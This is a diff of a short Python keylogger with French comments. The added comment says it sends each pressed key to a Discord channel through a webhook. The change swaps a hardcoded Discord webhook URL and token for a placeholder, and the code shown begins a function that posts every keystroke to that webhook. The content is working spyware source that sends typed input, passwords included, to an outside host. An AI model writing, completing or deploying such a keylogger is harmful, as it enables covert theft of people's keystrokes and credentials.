@@ -1,8 +1,10 @@
-import keyboard
-import requests
+# Ce KeyLogger fonctionne avec une webhook (discord) qui permet que dès que une touche et cliqué ca l'envoie directement dans le salons discord
+
+import keyboard # import librairie "keyboard"
+import requests # import librairie "requests"
 
 
-webhook_url = "https://discord.com/api/webhooks/1410000899102867466/2HSu9ya1NGr0iCyqr4U8n2ZpKcnzrcVOtpDl5E3Xkak6HBExWz58IuNMADLN_55BuJDR"
+webhook_url = "Merci d'insérer ici votre tokenURL de votre webhook" 
 
 def envoyer_webhook(touche):
     payload = {"content": f"[{touche}]"}
